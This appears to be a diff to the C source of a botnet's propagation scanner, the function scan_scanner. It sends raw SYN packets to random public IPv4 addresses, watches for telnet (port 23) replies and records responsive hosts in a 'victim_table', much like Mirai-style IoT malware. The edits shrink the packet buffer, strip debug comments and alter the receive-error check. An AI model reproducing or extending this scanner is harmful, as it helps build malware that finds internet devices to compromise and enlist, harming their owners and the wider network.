@@ -174,8 +174,8 @@ bool scan_scanner(void)
 
 	int32_t sock, i = 1, n;
 	uint16_t fails = 0;
-	char datagram[4096];
-	zero(datagram, 4096);
+	char datagram[200];
+	zero(datagram, 200);
 
 	// IP and TCP  structures
 	struct iphdr *iph = (struct iphdr *) datagram;
@@ -249,12 +249,10 @@ bool scan_scanner(void)
 		goto end;
 	}
 
-
 	memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
 
 	while (1)
 	{
-		// printd("Sending packets...")
 		for (i = 0; i < SCAN_SCANNER_BURST; i++)
 		{
 			addr.sin_addr.s_addr = ipv4_random_public(); // It should already be a 32 bit uint
@@ -284,7 +282,6 @@ bool scan_scanner(void)
 			}
 		}
 		i = 0;
-		// printd("Moving to recvfrom()");
 		while (1)
 		{
 			unsigned char buf[1514];
@@ -292,8 +289,8 @@ bool scan_scanner(void)
             struct tcphdr *rtcph = (struct tcphdr *)(iph + 1);
 			errno = 0;
 
-			n = recvfrom(sock, buf, sizeof(buf), 0, NULL, NULL);
-			if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
+			n = recvfrom(sock, buf, sizeof(buf), MSG_NOSIGNAL, NULL, NULL);
+			if (n <= 0 /*|| errno == EAGAIN || errno == EWOULDBLOCK*/&& errno != 0)
 				break;
 
 			printf("%s->%s %d %d %d %d %d\n", ipv4_unpack(riph->saddr), ipv4_unpack(riph->daddr), riph->protocol, rtcph->syn, rtcph->ack, htons(rtcph->source), htons(rtcph->dest));
@@ -307,7 +304,7 @@ bool scan_scanner(void)
 			if (rtcph->source != htons(23))
 				break;
 
-			printd("Got a live one! %s flags: SYN %d ACK %d FIN %d", ipv4_unpack(riph->saddr), rtcph->syn, rtcph->ack,rtcph->fin);
+			printd("Got a live one: %s flags: SYN %d ACK %d FIN %d", ipv4_unpack(riph->saddr), rtcph->syn, rtcph->ack,rtcph->fin);
 			
 			struct scan_victim *victim;
 			victim = &victim_table[i];
